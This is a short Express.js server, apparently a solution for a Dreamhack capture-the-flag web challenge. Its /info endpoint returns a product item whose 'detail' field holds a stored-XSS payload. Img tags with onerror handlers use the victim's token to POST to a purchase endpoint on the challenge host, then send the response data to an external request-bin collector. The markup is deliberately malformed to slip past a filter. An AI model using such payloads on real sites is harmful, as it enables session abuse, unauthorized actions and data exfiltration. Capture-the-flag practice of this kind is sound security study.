const express = require('express');
const app = express();
const cors = require('cors');

app.use(cors());

const PORT = 4000;
const url = "http://host3.dreamhack.games:18849";
const rqb = "https://ouvjfih.request.dreamhack.games";

app.use(express.json());

app.get('/info', (req, res) => {
    const token = req.headers['token'];

    const items = {
        "id": 1,
        "name": "Web Hacking 강의",
        "price": 1024,
        "detail": `
        <<img src='' onerror='
        fetch("${url}/4/buy", {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
                "token": "${token}"
            }
        })
        .then(response => response.json())
        .then(data => {
            fetch("${rqb}/"+data.data)
            console.log(data.data)
        })
        '/&gt;img src='' onerror='
        fetch("${url}/4/buy", {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
                "token": "${token}"
            }
        })
        .then(response => response.json())
        .then(data => {
            fetch("${rqb}/"+data.data)
            console.log(data.data)
        })
        '/>
        `,
        "poster": ""
    }

    if (items) {
        res.send(items);
    } else {
        res.status(403).send('');
    }
});

app.post('/log', (req, res) => {
    console.log("Received from client:", req.body.message);
    res.sendStatus(200);
});

app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});
